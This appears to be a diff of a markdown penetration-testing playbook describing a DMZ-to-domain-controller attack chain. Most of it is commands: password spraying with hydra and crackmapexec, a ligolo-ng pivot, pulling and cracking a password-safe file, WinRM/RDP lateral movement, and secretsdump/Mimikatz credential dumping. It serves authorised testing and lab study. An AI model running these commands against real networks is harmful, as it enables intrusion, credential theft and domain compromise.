@@ -1,10 +1,3 @@
----
-title: "DMZ Foothold → Pivot → Credential Chain → DC Compromise"
-tags: [dmz, pivoting, ligolo, credential-chain, smb, password-spraying, pass-the-hash]
-author: "RedMind"
-date: 2025-10-01
----
-
 # DMZ Foothold → Pivot → Credential Chain → DC Compromise
 
 **TL;DR**  
@@ -13,17 +6,20 @@ From an initial DMZ credential or sparse credential clue, gain a foothold, estab
 ---
 
 ## Goal
+
 - Obtain initial access in DMZ from credential spray or discovered credential artifacts.  
 - Establish a pivot into internal subnet for enumeration and lateral movement.  
 - Harvest credential artifacts (password safe files, cached creds) and obtain NTLM/Administrator hashes for domain compromise.
 
 ## Prerequisites
+
 - Environment: attacker host with `ligolo-ng`, `smbclient`, `smbmap`, `nmap`, `hydra`/`crackmapexec`, `hashcat`, and `snaffler` (or similar).  
 - Basic familiarity with SMB enumeration and RDP/WinRM tooling.
 
 ---
 
 ## High-Level Flow
+
 1. Generate username candidates and password-spray SSH/other DMZ services to find weak creds.  
 2. Use valid credential(s) to access DMZ host (DMZ01). Drop pivot tooling (Ligolo‑ng or similar).  
 3. Pivot into internal range (e.g., `172.16.119.0/24`).  
@@ -38,6 +34,7 @@ From an initial DMZ credential or sparse credential clue, gain a foothold, estab
 ## Commands & Techniques
 
 ### 1) Username generation & password spray (SSH/RDP/SMB)
+
 ```bash
 # hydra example (ssh)
 hydra -L users.txt -P rockyou.txt ssh://10.10.10.10 -t 8
@@ -47,6 +44,7 @@ crackmapexec smb 172.16.119.0/24 -u users.txt -p 'Password1' --continue-on-succe
 ```
 
 ### 2) Drop and run Ligolo‑ng pivot
+
 ```bash
 # on attacker
 ligolo-ng -listen 0.0.0.0:9001 -proto tcp -server
@@ -55,6 +53,7 @@ ligolo-ng -listen 0.0.0.0:9001 -proto tcp -server
 ```
 
 ### 3) SMB enumeration & pull artifacts
+
 ```bash
 smbclient -U 'NEXURA\hwilliam' \
   '\\172.16.119.10\HR' -c 'cd Archive; get Employee-Passwords_OLD.psafe3'
@@ -64,12 +63,14 @@ smbmap -H 172.16.119.10 -u hwilliam -p 'password'
 ```
 
 ### 4) Crack Password Safe v3 (.psafe3)
+
 ```bash
 # hashcat mode 5200 (Password Safe v3)
 hashcat -m 5200 Employee-Passwords_OLD.psafe3 /usr/share/wordlists/rockyou.txt.gz --force
 ```
 
 ### 5) Lateral movement: RDP / WinRM / SMB
+
 ```bash
 # xfreerdp (RDP)
 xfreerdp /v:JUMP01 /u:administrator /p:'P@ssw0rd'
@@ -79,6 +80,7 @@ evil-winrm -i JUMP01 -u Administrator -p 'P@ssw0rd'
 ```
 
 ### 6) Dumping credentials / hashes
+
 ```bash
 # Mimikatz (lsass) on a jump host
 # Or use impacket-secretsdump for remote dumping with creds
@@ -91,12 +93,14 @@ secretsdump.py -just-dc -outputfile dump DOMAIN/Administrator@dc01.domain.local
 ---
 
 ## Things to Watch For (red flags)
+
 - Password safes in shared folders (`.psafe3`, KeePass, etc.).  
 - Reused credentials across DMZ → internal jump hosts.  
 - Unexpected SMB shares with backup/archive files.  
 - Presence of defensive tooling that may detect pivoting (EDR/IPS in lab may be disabled).
 
 ## Cleanup & Safety
+
 - Remove ligolo client binaries and any uploaded tools.  
 - Clear temporary files, check for persistent services created by you.  
 - In lab: snapshot/rollback. In real engagements: document actions and leave forensic artifacts intact unless otherwise agreed per ROE.
@@ -104,8 +108,8 @@ secretsdump.py -just-dc -outputfile dump DOMAIN/Administrator@dc01.domain.local
 ---
 
 ## Further reading / tools
+
 - `ligolo-ng` (pivoting) — multi‑hop tunneling.  
 - `snaffler` — artifact hunting.  
 - `hashcat` — offline cracking.  
 - `impacket` tools — `secretsdump`, DCSync helpers.
-
